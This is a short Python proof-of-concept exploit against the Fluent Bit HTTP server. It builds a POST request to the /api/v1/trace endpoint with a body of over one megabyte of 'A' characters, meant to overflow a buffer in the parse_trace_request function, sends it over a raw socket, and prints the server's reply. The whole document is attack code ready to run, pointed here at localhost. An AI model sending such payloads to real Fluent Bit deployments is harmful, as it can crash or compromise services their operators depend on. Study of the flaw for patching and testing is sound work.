import socket

# Target IP address and port
target_ip = '127.0.0.1'
target_port = 2020  # Replace with the actual port Fluent Bit HTTP server listens to

# Construct a malicious payload that exceeds the buffer size
# The payload size should be larger than the MAX_ALLOWED_SIZE defined in the patch (e.g., 1MB)
payload_size = 1024 * 1024 + 1  # 1MB + 1 byte to trigger the overflow
malicious_payload = 'A' * payload_size

# Construct the HTTP request to trigger the vulnerable parse_trace_request function
http_request = (
    "POST /api/v1/trace HTTP/1.1\r\n"
    "Host: {}\r\n"
    "Content-Type: application/json\r\n"
    "Content-Length: {}\r\n"
    "\r\n"
    "{}"
).format(target_ip, payload_size, malicious_payload)

# Send the malicious request to the target server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((target_ip, target_port))
    sock.sendall(http_request.encode('utf-8'))
    response = sock.recv(1024)

print("Response from server:")
print(response.decode('utf-8'))
